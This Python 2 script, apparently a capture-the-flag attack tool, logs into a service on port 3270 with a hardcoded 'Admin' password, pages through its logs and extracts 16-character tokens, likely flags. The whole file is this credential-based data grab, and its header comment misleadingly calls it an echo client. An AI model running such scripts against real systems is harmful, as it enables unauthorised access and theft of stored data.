#!/usr/bin/python
# Echo client program
import socket
import sys
import time
import re

HOST = sys.argv[1]    # The remote host
PORT = 3270           # The same port as used by the server
s = None
for res in socket.getaddrinfo(HOST, PORT, socket.AF_UNSPEC, socket.SOCK_STREAM):
    af, socktype, proto, canonname, sa = res
    try:
	s = socket.socket(af, socktype, proto)
    except socket.error, msg:
	s = None
	continue
    try:
	s.connect(sa)
    except socket.error, msg:
	s.close()
	s = None
	continue
    break
if s is None:
    print 'could not open socket'
    sys.exit(1)

def read_until(s, sign='>'):
    data = ''
    while True:
        chunk = s.recv(42)
        
        if not chunk:
            break

        data += chunk

        if not chunk or sign in data:
            break

    return data

s.settimeout(23)

recv_hello = read_until(s, '> ')

s.send("LOGIN Admin qwertys\n")

recv_login = read_until(s, '> ')

rex = re.compile("-> \S{11}\s(\S{16})", re.MULTILINE)

collector = {}
last_page = 0
for n in xrange(1, 3):

    s.send("LOG %d\n" % (n))
    recv_log = read_until(s, '===  END OF LOG  ===')

    m = rex.findall(recv_log)

    if not n in collector:
        collector[n] = []

    if len(m) == 0:
        last_page = n
        break

    for entry in m:
        collector[n].append(entry)

lcol = len(collector)

for page in xrange(1, lcol):
    for entry in collector[page]:
        print entry

s.close()
